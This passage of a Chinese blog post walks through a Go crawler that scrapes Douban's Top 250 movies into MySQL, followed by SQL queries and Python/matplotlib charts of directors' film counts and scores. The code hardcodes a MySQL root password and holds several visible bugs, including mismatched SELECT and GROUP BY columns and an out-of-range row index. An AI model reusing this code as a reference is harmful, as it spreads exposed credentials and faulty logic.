punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-Site"</span><span class="token punctuation">,</span> <span class="token string">"same-origin"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-Mode"</span><span class="token punctuation">,</span> <span class="token string">"navigate"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-User"</span><span class="token punctuation">,</span> <span class="token string">"?1"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-Dest"</span><span class="token punctuation">,</span> <span class="token string">"document"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Referer"</span><span class="token punctuation">,</span> <span class="token string">"https://movie.douban.com/chart"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept-Language"</span><span class="token punctuation">,</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">)</span>resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Do</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>docDetail<span class="token punctuation">,</span> err <span class="token operator">:=</span> goquery<span class="token punctuation">.</span><span class="token function">NewDocumentFromReader</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>docDetail<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"#content > div > div.article > ol > li > div"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Each</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>i <span class="token builtin">int</span><span class="token punctuation">,</span> s <span class="token operator">*</span>goquery<span class="token punctuation">.</span>Selection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> movieData MovieData<span class="token comment">//#content > div > div.article > ol > li:nth-child(16) > div > div.info > div.hd > a > span:nth-child(1)</span>title <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.hd > a > span:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>img <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.pic > a > img"</span><span class="token punctuation">)</span>imgTmp<span class="token punctuation">,</span> ok <span class="token operator">:=</span> img<span class="token punctuation">.</span><span class="token function">Attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">)</span>info <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>director<span class="token punctuation">,</span> actor<span class="token punctuation">,</span> year <span class="token operator">:=</span> <span class="token function">InfoSpite</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>score <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > div > span.rating_num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>score <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>score<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>quote <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p.quote > span"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">if</span> ok <span class="token punctuation">&#123;</span>movieData<span class="token punctuation">.</span>Title <span class="token operator">=</span> titlemovieData<span class="token punctuation">.</span>Director <span class="token operator">=</span> directormovieData<span class="token punctuation">.</span>Picture <span class="token operator">=</span> imgTmpmovieData<span class="token punctuation">.</span>Actor <span class="token operator">=</span> actormovieData<span class="token punctuation">.</span>Year <span class="token operator">=</span> yearmovieData<span class="token punctuation">.</span>Score <span class="token operator">=</span> scoremovieData<span class="token punctuation">.</span>Quote <span class="token operator">=</span> quotefmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>movieData<span class="token punctuation">)</span><span class="token function">InsertSql</span><span class="token punctuation">(</span>movieData<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// if ch != nil&#123;</span><span class="token comment">// ch &lt;- true</span><span class="token comment">// &#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InfoSpite</span><span class="token punctuation">(</span>info <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>director <span class="token punctuation">,</span>actor <span class="token punctuation">,</span> year <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>directorRe<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`导演:(.*)主演:`</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>director<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>director <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>directorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>director <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>directorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>director <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>director<span class="token punctuation">,</span> <span class="token string">"主演:"</span><span class="token punctuation">)</span>actorRe<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`主演:(.*)`</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>actor<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>actor <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>actorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>actor <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>actorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>yearRe<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`(\d+)`</span><span class="token punctuation">)</span>year <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>yearRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InitDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>DB<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"mysql"</span><span class="token punctuation">,</span> <span class="token string">"root:20030729a@tcp(localhost:3306)/movie"</span><span class="token punctuation">)</span>DB<span class="token punctuation">.</span><span class="token function">SetConnMaxLifetime</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>DB<span class="token punctuation">.</span><span class="token function">SetMaxIdleConns</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"opon database fail"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"connnect success"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InsertSql</span><span class="token punctuation">(</span>movieData MovieData<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>tx<span class="token punctuation">,</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"tx fail"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>stmt<span class="token punctuation">,</span> err <span class="token operator">:=</span> tx<span class="token punctuation">.</span><span class="token function">Prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO movie_data (`Title`,`Director`,`Actor`,`Year`,`Score`,`Quote`) VALUES (?, ?, ?,?,?,?)"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Prepare fail"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>movieData<span class="token punctuation">.</span>Title<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Director<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Actor<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Year<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Score<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Quote<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Exec fail"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span> <span class="token operator">=</span> tx<span class="token punctuation">.</span><span class="token function">Commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221106111317.png"></p></li><li><p>  而没有实现并发的爬虫爬取相同内容的时间达到了3s，比实现了并发的爬虫时间延长了三倍左右</p></li></ol><h2 id="数据分析阶段"><a href="#数据分析阶段" class="headerlink" title="数据分析阶段"></a>数据分析阶段</h2><ol><li>  该项目主要分析不同导演作品的数量，不同主演作品的数量和不同导演作品的得分</li></ol><h3 id="数据筛选"><a href="#数据筛选" class="headerlink" title="数据筛选"></a>数据筛选</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Director <span class="token keyword">from</span> movie<span class="token punctuation">.</span>movie_data <span class="token keyword">group</span> <span class="token keyword">by</span> Director<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221110111402.png"></p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221110111429.png"></p>  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Actor <span class="token keyword">from</span> movie<span class="token punctuation">.</span>movie_data <span class="token keyword">group</span> <span class="token keyword">by</span> Director<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="python实现mysql数据统计及可视化"><a href="#python实现mysql数据统计及可视化" class="headerlink" title="python实现mysql数据统计及可视化"></a>python实现mysql数据统计及可视化</h2><ol><li><p>链接数据库</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'20030729a'</span><span class="token punctuation">,</span> database<span class="token operator">=</span><span class="token string">'movie'</span><span class="token punctuation">)</span>cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''链接数据库 pymysql.connect的参数connection = pymysql.connect(host='localhost',                             user='user',                             password='passwd',                             database='db',                             charset='utf8mb4',                             cursorclass=pymysql.cursors.DictCursor)'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>数据处理阶段</p>  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select count(*) cnt,Director from movie.movie_data group by Director order by cnt desc;"</span><span class="token keyword">cursor</span><span class="token punctuation">.</span><span class="token keyword">execute</span><span class="token punctuation">(</span><span class="token keyword">sql</span><span class="token punctuation">)</span>res1 <span class="token operator">=</span> <span class="token keyword">cursor</span><span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>name <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>count <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>Score <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> <span class="token keyword">row</span> <span class="token operator">in</span> res1:    i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span>    count<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    name<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    cnt<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    Score<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">row</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>画图像阶段</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 画图像阶段</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span class="token comment"># 建立图标</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dpi<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴阶段</span><span class="token comment"># 设置坐标轴的范围</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 隐藏无用轴</span>ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>gca<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将上边的坐标轴颜色设置为空，不显示</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'top'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_color<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span><span class="token comment"># 将x轴设置为底部bottom,将y轴设置为顶部top</span>ax<span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>set_ticks_position<span class="token punctuation">(</span><span class="token string">'bottom'</span><span class="token punctuation">)</span><span class="token comment"># ax.xaxis.set_ticks_position('left')</span><span class="token comment"># 将x轴和y轴(底轴和左轴的位置设置为坐标原点)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'bottom'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'left'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴的名字</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Director'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Number'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>x <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment"># x轴每10一个刻度</span>y <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token comment"># y轴每15一个刻度</span>new_ticks <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>count<span class="token punctuation">,</span>name<span class="token punctuation">,</span>rotation<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span>l1 <span class="token operator">=</span> ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>name<span class="token punctuation">,</span>cnt<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>linewidth<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">)</span>ax2 <span class="token operator">=</span> ax<span class="token punctuation">.</span>twinx<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ax2.xaxis.set_ticks_position('bottom')</span><span class="token comment"># ax2.xaxis.set_ticks_position('right')</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>l2 <span class="token operator">=</span> ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>name<span class="token punctuation">,</span>Score<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>linewidth<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'Score'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'top'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_color<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Number'</span><span class="token punctuation">,</span><span class="token string">'Score'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'图例'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="完整实现代码"><a href="#完整实现代码" class="headerlink" title="完整实现代码"></a>完整实现代码</h3><h3 id="分析Director的作品数量和整体分数之间的关系"><a href="#分析Director的作品数量和整体分数之间的关系" class="headerlink" title="分析Director的作品数量和整体分数之间的关系"></a>分析Director的作品数量和整体分数之间的关系</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> MultipleLocator<span class="token comment"># 从数据库中获取数据阶段</span>db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'20030729a'</span><span class="token punctuation">,</span> database<span class="token operator">=</span><span class="token string">'movie'</span><span class="token punctuation">)</span>cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">"select count(*) cnt,Director,Score from movie.movie_data group by Director order by Score desc;"</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>res1 <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>name <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Score <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> row <span class="token keyword">in</span> res1<span class="token punctuation">:</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    count<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    cnt<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    Score<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 画图像阶段</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span class="token comment"># 建立图标</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token 